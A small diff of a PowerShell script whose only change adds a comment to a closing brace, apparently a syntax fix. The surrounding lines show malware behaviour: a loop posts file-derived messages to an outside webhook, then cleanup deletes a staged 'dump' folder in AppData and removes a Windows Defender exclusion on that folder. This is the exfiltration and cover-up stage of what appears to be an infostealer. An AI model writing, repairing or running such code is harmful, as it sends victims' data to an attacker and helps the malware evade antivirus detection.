@@ -121,10 +121,9 @@ foreach ($file in $files) {
         Invoke-RestMethod -Uri $webhook -Method Post -Body $msg -ContentType 'application/json; charset=utf-8'
         Start-Sleep -Seconds 1
     }
-}
+}  # <-- ADDED THIS CLOSING BRACE
 
 # Cleanup
 cd "$env:appdata"
 Remove-Item "$env:appdata\Microsoft\dump" -Force -Recurse -ErrorAction SilentlyContinue
 Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue
-
